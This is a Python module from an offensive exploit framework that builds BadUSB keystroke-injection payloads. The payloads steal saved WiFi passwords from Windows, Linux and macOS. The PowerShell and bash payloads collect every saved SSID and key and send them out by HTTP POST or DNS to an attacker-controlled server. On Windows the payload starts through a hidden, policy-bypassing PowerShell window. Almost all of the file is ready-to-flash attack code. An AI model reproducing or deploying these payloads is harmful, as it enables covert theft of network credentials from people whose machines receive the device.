# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import os
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """BadUSB WiFi Credential Harvesting via USB HID Emulation.

    Uses a programmable USB device (Rubber Ducky, Bash Bunny, DigiSpark,
    or similar HID-capable microcontroller) to emulate a keyboard and
    execute a payload that extracts stored WiFi credentials from the
    target system. The attack is entirely client-side: no network
    access is required initially.

    On Windows, the payload runs:
      netsh wlan show profiles
      netsh wlan show profile name=<SSID> key=clear

    On Linux, the payload reads:
      /etc/NetworkManager/system-connections/*.nmconnection

    On macOS, the payload queries:
      security find-generic-password -D "AirPort network password"

    Extracted credentials are exfiltrated via DNS, HTTP POST to an
    attacker-controlled server, or written to the USB device's
    mass storage partition.

    CVSS: N/A (physical access attack vector)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "BadUSB WiFi Credential Harvesting via HID Emulation",
        "description": (
            "Generates BadUSB payloads for USB HID devices (Rubber Ducky, "
            "Bash Bunny, DigiSpark) that extract stored WiFi credentials "
            "from Windows, Linux, and macOS targets. Supports DNS and "
            "HTTP exfiltration channels."
        ),
        "authors": (
            "Samy Kamkar (USBdriveby)",
            "Hak5 (Rubber Ducky)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://shop.hak5.org/products/usb-rubber-ducky",
            "https://samy.pl/usbdriveby/",
            "https://github.com/hak5/bashbunny-payloads",
        ),
        "disclosure_date": "2014-11-15",
        "platform": "multi",
        "arch": "all",
        "privileged": False,
        "targets": (
            "Windows 10/11 (netsh wlan)",
            "Linux with NetworkManager",
            "macOS (security keychain)",
        ),
    }

    target = OptIP("", "Exfiltration server IP for extracted credentials")
    port = OptPort(8080, "Exfiltration server port (HTTP POST)")
    timeout = OptFloat(5.0, "Payload execution timeout")
    interface = OptString("", "Not used (USB HID attack)")
    target_os = OptString("windows", "Target OS: windows, linux, macos")
    exfil_method = OptString("http", "Exfiltration method: http, dns, file")
    output_path = OptString("", "Path to write generated payload script")
    keystroke_delay = OptInteger(50, "Delay between keystrokes in milliseconds")

    # DuckyScript command constants
    _DS_DELAY = "DELAY"
    _DS_STRING = "STRING"
    _DS_ENTER = "ENTER"
    _DS_GUI = "GUI"
    _DS_CTRL = "CTRL"

    # HID usage codes for USB report descriptors
    _HID_KEY_ENTER = 0x28
    _HID_KEY_GUI = 0xE3
    _HID_KEY_TAB = 0x2B
    _HID_KEY_SPACE = 0x2C

    def _build_windows_payload(self) -> str:
        """Generate PowerShell payload for Windows WiFi credential extraction."""
        exfil = self._build_exfil_command("$output")

        ps_script = (
            "$profiles = (netsh wlan show profiles) | "
            "Select-String ':\\s+(.+)$' | "
            "ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; "
            "$output = ''; "
            "foreach ($p in $profiles) { "
            "  $detail = netsh wlan show profile name=$p key=clear; "
            "  $key = ($detail | Select-String 'Key Content\\s+:\\s+(.+)$').Matches.Groups[1].Value; "
            "  $output += \"$p`:$key`n\" "
            "}; "
            f"{exfil}"
        )
        return ps_script

    def _build_linux_payload(self) -> str:
        """Generate bash payload for Linux WiFi credential extraction."""
        exfil = self._build_exfil_command("$output")

        bash_script = (
            "output=''; "
            "for f in /etc/NetworkManager/system-connections/*.nmconnection; do "
            "  ssid=$(grep '^ssid=' \"$f\" 2>/dev/null | cut -d= -f2); "
            "  psk=$(grep '^psk=' \"$f\" 2>/dev/null | cut -d= -f2); "
            "  output=\"${output}${ssid}:${psk}\\n\"; "
            "done; "
            f"{exfil}"
        )
        return bash_script

    def _build_macos_payload(self) -> str:
        """Generate bash payload for macOS WiFi credential extraction."""
        exfil = self._build_exfil_command("$output")

        bash_script = (
            "output=''; "
            "for ssid in $("
            "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/"
            "airport -s | awk 'NR>1{print $1}'"
            "); do "
            "  psk=$(security find-generic-password -D 'AirPort network password' "
            "    -a \"$ssid\" -w 2>/dev/null); "
            "  output=\"${output}${ssid}:${psk}\\n\"; "
            "done; "
            f"{exfil}"
        )
        return bash_script

    def _build_exfil_command(self, var_name: str) -> str:
        """Build the exfiltration command based on configured method."""
        if self.exfil_method == "http":
            return (
                f"Invoke-WebRequest -Uri 'http://{self.target}:{self.port}/exfil' "
                f"-Method POST -Body {var_name} -ErrorAction SilentlyContinue"
                if self.target_os == "windows"
                else f"curl -s -X POST -d {var_name} http://{self.target}:{self.port}/exfil"
            )
        elif self.exfil_method == "dns":
            return (
                f"echo {var_name} | base64 | "
                f"xargs -I{{}} nslookup {{}}.exfil.{self.target} 2>/dev/null"
            )
        else:
            return f"echo {var_name} > /tmp/.wifi_creds.txt"

    def _build_duckyscript(self, payload: str) -> str:
        """Wrap payload in DuckyScript for Rubber Ducky / Bash Bunny."""
        lines = []
        lines.append(f"{self._DS_DELAY} 1000")

        if self.target_os == "windows":
            lines.append(f"{self._DS_GUI} r")
            lines.append(f"{self._DS_DELAY} 500")
            lines.append(f"{self._DS_STRING} powershell -w hidden -ep bypass")
            lines.append(self._DS_ENTER)
            lines.append(f"{self._DS_DELAY} 1000")
            lines.append(f"{self._DS_STRING} {payload}")
            lines.append(self._DS_ENTER)
        elif self.target_os == "linux":
            lines.append(f"{self._DS_CTRL} {self._DS_GUI} t")  # Open terminal
            lines.append(f"{self._DS_DELAY} 500")
            lines.append(f"{self._DS_STRING} {payload}")
            lines.append(self._DS_ENTER)
        else:  # macOS
            lines.append(f"{self._DS_GUI} SPACE")
            lines.append(f"{self._DS_DELAY} 500")
            lines.append(f"{self._DS_STRING} Terminal")
            lines.append(self._DS_ENTER)
            lines.append(f"{self._DS_DELAY} 1000")
            lines.append(f"{self._DS_STRING} {payload}")
            lines.append(self._DS_ENTER)

        lines.append(f"{self._DS_DELAY} 2000")
        return "\n".join(lines)

    def _build_hid_report(self, key_code: int, modifier: int = 0) -> bytes:
        """Build a USB HID keyboard report descriptor."""
        return struct.pack("BBBBBBBB", modifier, 0, key_code, 0, 0, 0, 0, 0)

    @mute
    def check(self) -> bool:
        """Verify payload generation capability."""
        return self.target_os in ("windows", "linux", "macos")

    def run(self) -> None:
        if self.target_os not in ("windows", "linux", "macos"):
            print_error("target_os must be 'windows', 'linux', or 'macos'")
            return

        print_success(
            f"Generating BadUSB WiFi credential payload for {self.target_os}"
        )
        self._exploit()

    def _exploit(self) -> None:
        # Generate OS-specific payload
        if self.target_os == "windows":
            payload = self._build_windows_payload()
        elif self.target_os == "linux":
            payload = self._build_linux_payload()
        else:
            payload = self._build_macos_payload()

        print_status(f"Payload length: {len(payload)} chars")
        print_info(f"Exfiltration method: {self.exfil_method}")
        if self.target:
            print_info(f"Exfil target: {self.target}:{self.port}")

        # Generate DuckyScript
        ducky = self._build_duckyscript(payload)
        print_status(f"DuckyScript generated ({len(ducky.splitlines())} lines)")

        # Build HID reports for the first few keystrokes
        hid_reports = []
        hid_reports.append(self._build_hid_report(self._HID_KEY_GUI))  # GUI key
        hid_reports.append(self._build_hid_report(0))  # Release
        print_info(f"HID report descriptors: {len(hid_reports)} reports prepared")

        # Save to file if requested
        if self.output_path:
            try:
                with open(str(self.output_path), "w") as f:
                    f.write(ducky)
                print_success(f"Payload saved to {self.output_path}")
            except OSError as e:
                print_error(f"Cannot write payload: {e}")

        print_success(
            f"BadUSB payload ready for {self.target_os}. "
            f"Flash to Rubber Ducky / Bash Bunny / DigiSpark. "
            f"Upon insertion, the device emulates keystrokes to extract "
            f"stored WiFi SSIDs and PSKs, then exfiltrates via "
            f"{self.exfil_method}."
        )
